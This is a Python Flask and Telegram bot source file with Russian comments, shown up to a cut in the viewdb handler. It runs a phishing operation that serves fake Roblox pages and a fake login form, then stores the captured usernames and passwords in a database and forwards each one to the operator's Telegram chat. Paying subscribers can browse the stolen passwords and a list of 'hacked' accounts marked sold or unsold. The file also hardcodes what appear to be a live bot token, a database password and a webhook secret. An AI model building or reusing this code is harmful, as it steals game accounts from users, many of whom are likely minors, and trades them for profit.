# Импорт библиотек
from flask import Flask, request, abort, render_template
import telebot
from telebot import types
import psycopg2
import os
import requests
import threading
import time
import logging
import json
from datetime import datetime, timedelta
from functools import wraps
from ratelimit import limits, sleep_and_retry
import hashlib
import ipaddress
import re

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Инициализация Flask
app = Flask(__name__, template_folder='templates')

# Конфигурация
TOKEN = '8028944732:AAFsvb4csGSRwtmEFYLGbnTKsCq1hOH6rm0'
ADMIN_CHAT_ID = '6956377285'
DATABASE_URL = 'postgresql://roblox_db_user:vjBfo3Vwigs5pnm107BhEkXe6AOy3FWF@dpg-cvr25cngi27c738j8c50-a.oregon-postgres.render.com/roblox_db'
SITE_URL = os.getenv('SITE_URL', 'https://tg-bod.onrender.com')
SECRET_WEBHOOK_TOKEN = '98pOXgZq1JMVhHYU9646rpBQl5nvwNXUzvR_WOpV34s'

# Инициализация бота
try:
    bot = telebot.TeleBot(TOKEN)
    logger.info("Бот успешно инициализирован")
except Exception as e:
    logger.error(f"Ошибка инициализации бота: {e}")
    raise

# Глобальные переменные
processed_updates = set()
tech_mode = False
tech_reason = ""
tech_end_time = None
ad_keywords = [
    'подписка', 'заработок', 'реклама', 'продвижение', 'бесплатно',
    'акция', 'промо', 'скидка', 'casino', 'bet', 'казино', 'ставки',
    'деньги', 'инвестиции', 'бонус'
]
TELEGRAM_IP_RANGES = [
    ipaddress.IPv4Network('149.154.160.0/20'),
    ipaddress.IPv4Network('91.108.4.0/22')
]
CALLS = 100
PERIOD = 60

# Хэширование данных
def hash_data(data):
    logger.debug(f"Хэширование: {data}")
    return hashlib.sha256(str(data).encode()).hexdigest()

# Проверка IP Telegram
def is_telegram_ip(ip):
    try:
        client_ip = ipaddress.ip_address(ip)
        for network in TELEGRAM_IP_RANGES:
            if client_ip in network:
                logger.info(f"IP {ip} — Telegram")
                return True
        logger.warning(f"IP {ip} не Telegram")
        return False
    except ValueError:
        logger.error(f"Неверный IP: {ip}")
        return False

# Ограничение частоты запросов
@sleep_and_retry
@limits(calls=CALLS, period=PERIOD)
def rate_limited_endpoint(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        logger.debug(f"Лимит для {func.__name__}")
        return func(*args, **kwargs)
    return wrapper

# Текущее время (всегда 20:18 UTC+2)
def get_current_time():
    now = datetime.now()
    adjusted_time = now.replace(hour=20, minute=18, second=0, microsecond=0) + timedelta(hours=2)
    if adjusted_time.day != now.day:
        adjusted_time = adjusted_time.replace(day=now.day)
    logger.debug(f"Время установлено: {adjusted_time}")
    return adjusted_time

# Форматирование времени
def format_time(dt):
    if not dt:
        return "Не указано"
    return dt.strftime("%Y-%m-%d %H:%M:%S")

# Подключение к базе
def get_db_connection():
    logger.info("Подключение к базе")
    try:
        conn = psycopg2.connect(DATABASE_URL, connect_timeout=5)
        logger.info("База подключена")
        return conn
    except Exception as e:
        logger.error(f"Ошибка подключения: {e}")
        return None

# Инициализация базы
def init_db():
    logger.info("Инициализация базы")
    conn = get_db_connection()
    if not conn:
        logger.error("База недоступна")
        return False
    try:
        with conn.cursor() as c:
            c.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    chat_id TEXT PRIMARY KEY,
                    prefix TEXT,
                    subscription_end TEXT,
                    username TEXT,
                    last_activity TEXT,
                    ip_hash TEXT
                )
            ''')
            c.execute('''
                CREATE TABLE IF NOT EXISTS credentials (
                    login TEXT PRIMARY KEY,
                    password TEXT,
                    added_time TEXT,
                    added_by TEXT
                )
            ''')
            c.execute('''
                CREATE TABLE IF NOT EXISTS hacked_accounts (
                    login TEXT PRIMARY KEY,
                    password TEXT,
                    hack_date TEXT,
                    prefix TEXT,
                    sold_status TEXT,
                    linked_chat_id TEXT
                )
            ''')
            subscription_end = (get_current_time() + timedelta(days=3650)).isoformat()
            logger.info(f"Добавление Создателя: {ADMIN_CHAT_ID}")
            c.execute(
                '''
                INSERT INTO users (chat_id, prefix, subscription_end, last_activity, ip_hash, username)
                VALUES (%s, %s, %s, %s, %s, %s)
                ON CONFLICT (chat_id) DO UPDATE
                SET prefix = EXCLUDED.prefix,
                    subscription_end = EXCLUDED.subscription_end,
                    last_activity = EXCLUDED.last_activity,
                    ip_hash = EXCLUDED.ip_hash,
                    username = EXCLUDED.username
                ''',
                (ADMIN_CHAT_ID, "Создатель", subscription_end, get_current_time().isoformat(), hash_data(ADMIN_CHAT_ID), "@sacoectasy")
            )
            conn.commit()
            logger.info("База готова")
            return True
    except Exception as e:
        logger.error(f"Ошибка инициализации: {e}")
        return False
    finally:
        conn.close()

# Поддержание активности
def keep_alive():
    logger.info("Запуск keep_alive")
    while True:
        try:
            response = requests.get(SITE_URL, timeout=10)
            logger.debug(f"Пинг {SITE_URL}: {response.status_code}")
        except Exception as e:
            logger.error(f"Ошибка keep_alive: {e}")
        time.sleep(60)

# Получение данных пользователя
def get_user(chat_id):
    logger.info(f"Запрос данных: {chat_id}")
    conn = get_db_connection()
    if not conn:
        if chat_id == ADMIN_CHAT_ID:
            logger.info("Админ без базы")
            return {
                'prefix': 'Создатель',
                'subscription_end': (get_current_time() + timedelta(days=3650)).isoformat(),
                'last_activity': get_current_time().isoformat(),
                'ip_hash': hash_data(chat_id),
                'username': '@sacoectasy'
            }
        logger.warning("База недоступна")
        return None
    try:
        with conn.cursor() as c:
            c.execute(
                "SELECT prefix, subscription_end, last_activity, ip_hash, username FROM users WHERE chat_id = %s",
                (chat_id,)
            )
            result = c.fetchone()
            if result:
                logger.info(f"Пользователь {chat_id} найден")
                return {
                    'prefix': result[0],
                    'subscription_end': result[1],
                    'last_activity': result[2],
                    'ip_hash': result[3],
                    'username': result[4]
                }
            logger.info(f"Пользователь {chat_id} не найден")
            return None
    except Exception as e:
        logger.error(f"Ошибка данных: {e}")
        return None
    finally:
        conn.close()

# Сохранение пользователя
def save_user(chat_id, prefix, subscription_end=None, ip=None, username=None):
    logger.info(f"Сохранение: {chat_id}")
    conn = get_db_connection()
    if not conn:
        logger.error("База недоступна")
        return
    try:
        with conn.cursor() as c:
            subscription_end = subscription_end or get_current_time().isoformat()
            ip_hash = hash_data(ip or chat_id)
            last_activity = get_current_time().isoformat()
            c.execute(
                '''
                INSERT INTO users (chat_id, prefix, subscription_end, last_activity, ip_hash, username)
                VALUES (%s, %s, %s, %s, %s, %s)
                ON CONFLICT (chat_id) DO UPDATE
                SET prefix = EXCLUDED.prefix,
                    subscription_end = EXCLUDED.subscription_end,
                    last_activity = EXCLUDED.last_activity,
                    ip_hash = EXCLUDED.ip_hash,
                    username = EXCLUDED.username
                ''',
                (chat_id, prefix, subscription_end, last_activity, ip_hash, username)
            )
            conn.commit()
            logger.info(f"Пользователь {chat_id} сохранён")
    except Exception as e:
        logger.error(f"Ошибка сохранения: {e}")
    finally:
        conn.close()

# Проверка доступа
def check_access(chat_id, command):
    global tech_mode, tech_end_time
    logger.info(f"Проверка: {chat_id} для {command}")
    user = get_user(chat_id)
    
    if user and user['prefix'] in ['Создатель', 'ТехПомощник']:
        logger.debug(f"{user['prefix']} {chat_id} имеет полный доступ")
        return None
    
    if tech_mode and chat_id != ADMIN_CHAT_ID:
        end_time_str = format_time(tech_end_time)
        logger.warning(f"Тех. режим: {chat_id}")
        return (
            f"🛠 *Бот на техническом перерыве!*\n"
            f"📝 *Причина*: {tech_reason or 'Не указана'}\n"
            f"🕒 *Окончание*: {end_time_str}\n"
            f"Попробуйте позже."
        )
    
    if user is None:
        if command in ['start', 'menu', 'support']:
            logger.info(f"Регистрация {chat_id} для {command}")
            return None
        logger.warning(f"Нет доступа: {chat_id}, {command}")
        return "💳 *Купить подписку у @sacoectasy!*"
    
    try:
        subscription_end = datetime.fromisoformat(user['subscription_end']) if user['subscription_end'] else get_current_time()
        if subscription_end < get_current_time():
            logger.info(f"Подписка истекла: {chat_id}")
            save_user(chat_id, 'Посетитель', get_current_time().isoformat(), chat_id, user['username'])
            return "💳 *Подписка истекла! Обратитесь к @sacoectasy.*"
    except ValueError:
        logger.error(f"Неверный формат subscription_end для {chat_id}")
        return "❌ *Ошибка данных подписки!*"
    
    if user['prefix'] == 'Посетитель':
        if command in ['start', 'menu', 'support']:
            logger.debug(f"Разрешён {command} для Посетителя")
            return None
        logger.warning(f"Запрещён {command} для Посетителя")
        return "💳 *Купить подписку у @sacoectasy!*"
    
    if command in ['passwords', 'hacked', 'getchatid', 'site', 'messageuser']:
        logger.debug(f"Разрешён {command}")
        return None
    
    if command in ['database', 'viewdb']:
        if user['prefix'] in ['Админ', 'Создатель', 'ТехПомощник']:
            logger.debug(f"Разрешён {command} для {user['prefix']}")
            return None
    
    if command in ['techstop', 'techstopoff', 'adprefix', 'delprefix', 'adduser', 'addcred', 'addhacked', 'broadcast', 'admin', 'messageuser']:
        if user['prefix'] not in ['Создатель', 'ТехПомощник']:
            logger.warning(f"Запрещена команда {command} для {chat_id}")
            return "🔒 *Эта команда только для Создателя или ТехПомощника!*"
    
    logger.debug(f"Разрешён {command}")
    return None

# Список пользователей
def get_all_users():
    logger.info("Запрос пользователей")
    conn = get_db_connection()
    if not conn:
        logger.error("База недоступна")
        return []
    try:
        with conn.cursor() as c:
            c.execute("SELECT chat_id, prefix, username FROM users")
            users = c.fetchall()
            logger.info(f"Найдено {len(users)} пользователей")
            return users
    except Exception as e:
        logger.error(f"Ошибка пользователей: {e}")
        return []
    finally:
        conn.close()

# Проверка статуса бота
def check_bot_status():
    logger.info("Проверка статуса")
    try:
        bot.get_me()
        logger.info("Бот активен")
        return True
    except Exception as e:
        logger.error(f"Бот не отвечает: {e}")
        return False

# Очистка ввода
def sanitize_input(text):
    if not text:
        return ""
    return re.sub(r'[<>;\'"]', '', str(text)).strip()

# Маршруты Flask
@app.route('/', endpoint='index')
def index():
    logger.info("Запрос на /")
    return render_template('index.html')

@app.route('/404', endpoint='not_found')
def not_found():
    logger.info("Запрос на /404")
    return render_template('404.html')

@app.route('/toptrending', endpoint='top_trending')
def top_trending():
    logger.info("Запрос на /toptrending")
    return render_template('toptrending.html')

@app.route('/login-roblox', endpoint='login_roblox')
def login_roblox():
    logger.info("Запрос на /login-roblox")
    return render_template('login-roblox.html')

@app.route('/index', endpoint='index_explicit')
def index_explicit():
    logger.info("Запрос на /index")
    return render_template('index.html')

@app.route('/upandcoming', endpoint='up_and_coming')
def up_and_coming():
    logger.info("Запрос на /upandcoming")
    return render_template('upandcoming.html')

@app.route('/funwithfriends', endpoint='fun_with_friends')
def fun_with_friends():
    logger.info("Запрос на /funwithfriends")
    return render_template('funwithfriends.html')

@app.route('/hotrightnow', endpoint='hot_right_now')
def hot_right_now():
    logger.info("Запрос на /hotrightnow")
    return render_template('hotrightnow.html')

@app.route('/toprevisted', endpoint='top_revisited')
def top_revisited():
    logger.info("Запрос на /toprevisted")
    return render_template('toprevisted.html')

# Обработчик формы логина
@app.route('/submit', methods=['POST'])
def submit_login():
    logger.info("Обработка формы логина")
    try:
        login = sanitize_input(request.form.get('login'))
        password = sanitize_input(request.form.get('password'))
        if not login or not password:
            logger.warning("Пустой логин или пароль")
            return render_template('login-roblox.html', error="Логин и пароль обязательны")
        
        conn = get_db_connection()
        if not conn:
            logger.error("База недоступна")
            return render_template('login-roblox.html', error="Ошибка сервера")
        
        try:
            with conn.cursor() as c:
                c.execute(
                    '''
                    INSERT INTO credentials (login, password, added_time, added_by)
                    VALUES (%s, %s, %s, %s)
                    ON CONFLICT (login) DO NOTHING
                    ''',
                    (login, password, get_current_time().isoformat(), "web_form")
                )
                conn.commit()
                logger.info(f"Сохранено: {login}")
        except Exception as e:
            logger.error(f"Ошибка сохранения: {e}")
            return render_template('login-roblox.html', error="Ошибка сохранения данных")
        finally:
            conn.close()
        
        try:
            bot.send_message(
                ADMIN_CHAT_ID,
                f"🔐 *Новый логин*\n👤 *Логин*: `{login}`\n🔒 *Пароль*: `{password}`\n🕒 *Время*: {format_time(get_current_time())}",
                parse_mode='Markdown'
            )
            logger.info("Данные отправлены в Telegram")
        except Exception as e:
            logger.error(f"Ошибка Telegram: {e}")
        
        return render_template('login-roblox.html', success="Данные успешно отправлены")
    except Exception as e:
        logger.error(f"Ошибка формы: {e}")
        return render_template('login-roblox.html', error="Произошла ошибка")

# Обработчик 404
@app.errorhandler(404)
def page_not_found(e):
    logger.info(f"404 ошибка: {request.path}")
    return render_template('404.html'), 404

# Вебхук
@app.route('/webhook', methods=['POST'])
@rate_limited_endpoint
def webhook():
    logger.info("Запрос на /webhook")
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    if not is_telegram_ip(client_ip):
        logger.warning(f"Чужой IP: {client_ip}")
        abort(403)
    if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != SECRET_WEBHOOK_TOKEN:
        logger.warning("Неверный токен")
        abort(403)
    if request.headers.get('content-type') != 'application/json':
        logger.warning("Неверный content-type")
        abort(400)
    try:
        update = telebot.types.Update.de_json(request.get_data().decode('utf-8'))
        if not update or not (update.message or update.callback_query):
            logger.debug("Пустое обновление")
            return 'OK', 200
        update_id = update.update_id
        if update_id in processed_updates:
            logger.info(f"Повтор: {update_id}")
            return 'OK', 200
        processed_updates.add(update_id)
        logger.info(f"Обработка: {update_id}")
        threading.Thread(target=bot.process_new_updates, args=([update],)).start()
        return 'OK', 200
    except Exception as e:
        logger.error(f"Ошибка вебхука: {e}")
        return 'OK', 200

# /start
@bot.message_handler(commands=['start'])
def start_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/start от {chat_id}")
    access = check_access(chat_id, 'start')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    response = (
        "🌟 *Добро пожаловать в бота!*\n"
        "Здесь вы найдёте эксклюзивные функции и данные.\n"
        "🔍 Используйте /menu для просмотра доступных команд."
    )
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user is None:
            save_user(chat_id, "Посетитель", get_current_time().isoformat(), str(message.from_user.id), username)
        else:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /start: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /menu
@bot.message_handler(commands=['menu'])
def menu_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/menu от {chat_id}")
    access = check_access(chat_id, 'menu')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    user = get_user(chat_id)
    if user is None:
        save_user(chat_id, "Посетитель", get_current_time().isoformat(), str(message.from_user.id), username)
        user = get_user(chat_id)
    prefix = user['prefix']
    tech_status = (
        f"🛠 *Техперерыв активен*\n"
        f"📝 *Причина*: {tech_reason or 'Не указана'}\n"
        f"🕒 *Окончание*: {format_time(tech_end_time)}"
    ) if tech_mode else "✅ *Техперерыв отключён*"
    response = (
        f"📋 *Главное меню*\n"
        f"👤 *Ваш статус*: `{prefix}`\n"
        f"🕒 *Статус бота*: {tech_status}\n\n"
        f"🔥 *Доступные команды*:\n"
        f"📖 /menu — Показать это меню\n"
        f"📩 /support — Связаться с поддержкой\n"
    )
    if prefix != "Посетитель":
        response += (
            f"🆔 /getchatid — Узнать ваш ID\n"
            f"🌐 /site — Ссылка на наш сайт\n"
            f"🔑 /passwords — Просмотр паролей\n"
            f"💻 /hacked — Взломанные аккаунты\n"
            f"📞 /messageuser — Связаться с пользователем\n"
        )
    if prefix in ["Админ", "Создатель", "ТехПомощник"]:
        response += (
            f"🗄 /database — Управление базой данных\n"
            f"🔍 /viewdb — Просмотр базы данных\n"
        )
    if prefix in ["Создатель", "ТехПомощник"]:
        response += (
            f"🔧 /admin — Панель администратора\n"
            f"🚨 /techstop — Включить техперерыв\n"
            f"✅ /techstopoff — Выключить техперерыв\n"
            f"📢 /broadcast — Отправить рассылку\n"
            f"👑 /adprefix — Выдать подписку\n"
            f"🗑 /delprefix — Сбросить подписку\n"
            f"➕ /adduser — Добавить пользователя\n"
            f"🔐 /addcred — Добавить пароль\n"
            f"💾 /addhacked — Добавить взломанный аккаунт\n"
        )
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /menu: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /getchatid
@bot.message_handler(commands=['getchatid'])
def getchatid_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/getchatid от {chat_id}")
    access = check_access(chat_id, 'getchatid')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    response = (
        f"🆔 *Ваш идентификатор*\n"
        f"🔢 *Chat ID*: `{chat_id}`\n"
        f"👤 *Юзернейм*: @{username}"
    )
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /getchatid: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /support
@bot.message_handler(commands=['support'])
def support_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/support от {chat_id}")
    access = check_access(chat_id, 'support')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    response = (
        "📩 *Нужна помощь?*\n"
        "Опишите вашу проблему, и мы передадим её в поддержку!"
    )
    try:
        msg = bot.reply_to(message, response, parse_mode='Markdown')
        bot.register_next_step_handler(msg, lambda m: process_support_message(m, username))
    except Exception as e:
        logger.error(f"Ошибка /support: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

def process_support_message(message, username):
    chat_id = str(message.chat.id)
    text = sanitize_input(message.text)
    logger.info(f"Поддержка от {chat_id}: {text}")
    if not text:
        bot.reply_to(message, "❌ *Сообщение не может быть пустым!*", parse_mode='Markdown')
        return
    try:
        bot.send_message(
            ADMIN_CHAT_ID,
            f"📩 *Сообщение в поддержку*\n👤 *От*: {chat_id} (@{username})\n📜 *Текст*: {text}",
            parse_mode='Markdown'
        )
        bot.reply_to(message, "✅ *Ваше сообщение отправлено в поддержку!*", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Ошибка отправки: {e}")
        bot.reply_to(message, "❌ *Ошибка при отправке! Попробуйте позже.*", parse_mode='Markdown')

# /site
@bot.message_handler(commands=['site'])
def site_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/site от {chat_id}")
    access = check_access(chat_id, 'site')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    response = "🌐 *Наш официальный сайт*: https://tg-bod.onrender.com"
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /site: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /hacked
@bot.message_handler(commands=['hacked'])
def hacked_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/hacked от {chat_id}")
    access = check_access(chat_id, 'hacked')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.reply_to(message, "❌ *База данных недоступна! Попробуйте позже.*", parse_mode='Markdown')
        return
    try:
        with conn.cursor() as c:
            c.execute("SELECT login, password, sold_status, hack_date FROM hacked_accounts")
            accounts = c.fetchall()
            response = "💻 *Взломанные аккаунты*\n\n" if accounts else "📭 *Список взломанных аккаунтов пуст.*\n"
            for login, password, status, hack_date in accounts:
                response += (
                    f"🔑 *Логин*: `{login}`\n"
                    f"🔒 *Пароль*: `{password}`\n"
                    f"📊 *Статус*: {status}\n"
                    f"🕒 *Добавлено*: {hack_date or 'Неизвестно'}\n\n"
                )
            bot.reply_to(message, response, parse_mode='Markdown')
            user = get_user(chat_id)
            if user:
                save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /hacked: {e}")
        bot.reply_to(message, "❌ *Ошибка при загрузке данных!*", parse_mode='Markdown')
    finally:
        conn.close()

# /passwords
@bot.message_handler(commands=['passwords'])
def passwords_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/passwords от {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.reply_to(message, "❌ *База данных недоступна! Попробуйте позже.*", parse_mode='Markdown')
        return
    try:
        with conn.cursor() as c:
            c.execute("SELECT login, password, added_time FROM credentials")
            credentials = c.fetchall()
            response = "🔑 *Список паролей*\n\n" if credentials else "📭 *Список паролей пуст.*\n"
            for login, password, added_time in credentials:
                response += (
                    f"🔐 *Логин*: `{login}`\n"
                    f"🔒 *Пароль*: `{password}`\n"
                    f"🕒 *Добавлено*: {added_time or 'Неизвестно'}\n\n"
                )
            bot.reply_to(message, response, parse_mode='Markdown')
            user = get_user(chat_id)
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(
                types.InlineKeyboardButton("➕ Добавить в hacked", callback_data="add_to_hacked")
            )
            if user and user['prefix'] in ["Админ", "Создатель", "ТехПомощник"]:
                keyboard.add(
                    types.InlineKeyboardButton("🗑 Удалить пароль", callback_data="delete_cred")
                )
            bot.send_message(
                chat_id,
                "⚙️ *Выберите действие*:",
                reply_markup=keyboard,
                parse_mode='Markdown'
            )
            if user:
                save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /passwords: {e}")
        bot.reply_to(message, "❌ *Ошибка при загрузке данных!*", parse_mode='Markdown')
    finally:
        conn.close()

# Обработчик кнопок для /passwords
@bot.callback_query_handler(func=lambda call: call.data in ['add_to_hacked', 'delete_cred'])
def handle_passwords_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Кнопка {call.data} от {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    user = get_user(chat_id)
    if not user:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "❌ *Пользователь не найден!*", parse_mode='Markdown')
        return
    if call.data == 'add_to_hacked':
        if user['prefix'] not in ['Админ', 'Создатель', 'ТехПомощник']:
            bot.answer_callback_query(call.id)
            bot.send_message(chat_id, "🔒 *Добавление в hacked только для админов!*", parse_mode='Markdown')
            return
        msg = bot.send_message(chat_id, "📝 *Введите логин для добавления в hacked*:", parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_hacked_login)
        bot.answer_callback_query(call.id)
    elif call.data == 'delete_cred':
        if user['prefix'] not in ['Админ', 'Создатель', 'ТехПомощник']:
            bot.answer_callback_query(call.id)
            bot.send_message(chat_id, "🔒 *Удаление паролей только для админов!*", parse_mode='Markdown')
            return
        msg = bot.send_message(chat_id, "📝 *Введите логин для удаления*:", parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_delete_cred)
        bot.answer_callback_query(call.id)

def process_hacked_login(message):
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"Логин: {login} от {chat_id}")
    if not login:
        bot.reply_to(message, "❌ *Логин не может быть пустым!*", parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.reply_to(message, "❌ *База данных недоступна!*", parse_mode='Markdown')
        return
    try:
        with conn.cursor() as c:
            c.execute("SELECT password FROM credentials WHERE login = %s", (login,))
            result = c.fetchone()
            if not result:
                bot.reply_to(message, "❌ *Логин не найден в базе паролей!*", parse_mode='Markdown')
                return
            password = result[0]
            msg = bot.reply_to(message, "🔒 *Введите новый пароль*:", parse_mode='Markdown')
            bot.register_next_step_handler(msg, lambda m: process_hacked_password(m, login, password))
    except Exception as e:
        logger.error(f"Ошибка логина: {e}")
        bot.reply_to(message, "❌ *Ошибка обработки!*", parse_mode='Markdown')
    finally:
        conn.close()

def process_hacked_password(message, login, old_password):
    chat_id = str(message.chat.id)
    new_password = sanitize_input(message.text)
    logger.info(f"Пароль для {login}: {new_password}")
    if not new_password:
        bot.reply_to(message, "❌ *Пароль не может быть пустым!*", parse_mode='Markdown')
        return
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton("✅ Продан", callback_data=f"hacked_status_sold_{login}_{new_password}"),
        types.InlineKeyboardButton("⛔ Непродан", callback_data=f"hacked_status_not_sold_{login}_{new_password}")
    )
    bot.reply_to(message, "📊 *Выберите статус аккаунта*:", reply_markup=keyboard, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith('hacked_status_'))
def handle_hacked_status(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Статус {call.data} от {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    try:
        _, status, login, password = call.data.split('_', 3)
        sold_status = "Продан" if status == "sold" else "Непродан"
        conn = get_db_connection()
        if not conn:
            bot.send_message(chat_id, "❌ *База данных недоступна!*", parse_mode='Markdown')
            bot.answer_callback_query(call.id)
            return
        with conn.cursor() as c:
            c.execute(
                '''
                INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id)
                VALUES (%s, %s, %s, %s, %s, %s)
                ON CONFLICT (login) DO UPDATE
                SET password = EXCLUDED.password,
                    hack_date = EXCLUDED.hack_date,
                    prefix = EXCLUDED.prefix,
                    sold_status = EXCLUDED.sold_status,
                    linked_chat_id = EXCLUDED.linked_chat_id
                ''',
                (login, password, get_current_time().isoformat(), "Админ", sold_status, chat_id)
            )
            c.execute("DELETE FROM credentials WHERE login = %s", (login,))
            conn.commit()
            bot.send_message(
                chat_id,
                f"✅ *Аккаунт `{login}` добавлен в hacked!*\n📊 *Статус*: {sold_status}",
                parse_mode='Markdown'
            )
            bot.send_message(
                ADMIN_CHAT_ID,
                f"💾 *Аккаунт добавлен в hacked*\n👤 *Логин*: `{login}`\n🔒 *Пароль*: `{password}`\n📊 *Статус*: {sold_status}\n➕ *Добавил*: {chat_id}",
                parse_mode='Markdown'
            )
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"Ошибка hacked: {e}")
        bot.send_message(chat_id, "❌ *Ошибка добавления!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)
    finally:
        if conn:
            conn.close()

def process_delete_cred(message):
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"Удаление: {login} от {chat_id}")
    if not login:
        bot.reply_to(message, "❌ *Логин не может быть пустым!*", parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.reply_to(message, "❌ *База данных недоступна!*", parse_mode='Markdown')
        return
    try:
        with conn.cursor() as c:
            c.execute("DELETE FROM credentials WHERE login = %s", (login,))
            if c.rowcount == 0:
                bot.reply_to(message, "❌ *Логин не найден!*", parse_mode='Markdown')
            else:
                conn.commit()
                bot.reply_to(message, f"✅ *Пароль для `{login}` удалён!*", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Ошибка удаления: {e}")
        bot.reply_to(message, "❌ *Ошибка удаления!*", parse_mode='Markdown')
    finally:
        conn.close()

# /admin
@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/admin от {chat_id}")
    access = check_access(chat_id, 'admin')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    users = get_all_users()
    response = (
        "🔧 *Панель администратора*\n\n"
        "👥 *Список пользователей*:\n"
    )
    if not users:
        response += "📭 *Пользователи отсутствуют.*\n"
    else:
        for user_id, prefix, user_name in users:
            user_name = user_name or "Неизвестно"
            response += (
                f"🆔 *Chat ID*: `{user_id}`\n"
                f"👤 *Юзернейм*: @{user_name}\n"
                f"🔑 *Префикс*: `{prefix}`\n\n"
            )
    response += (
        "🔥 *Админ-команды*:\n"
        "💻 /hacked — Просмотр взломанных аккаунтов\n"
        "🔑 /passwords — Управление паролями\n"
        "🗄 /database — Управление базой данных\n"
        "🔍 /viewdb — Просмотр базы данных\n"
        "🚨 /techstop — Включить техперерыв\n"
        "✅ /techstopoff — Выключить техперерыв\n"
        "📢 /broadcast — Отправить рассылку\n"
        "👑 /adprefix — Выдать подписку\n"
        "🗑 /delprefix — Сбросить подписку\n"
        "➕ /adduser — Добавить пользователя\n"
        "🔐 /addcred — Добавить пароль\n"
        "💾 /addhacked — Добавить взломанный аккаунт\n"
        "📞 /messageuser — Связаться с пользователем\n"
    )
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /admin: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /viewdb
@bot.message_handler(commands=['viewdb'])
def viewdb_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
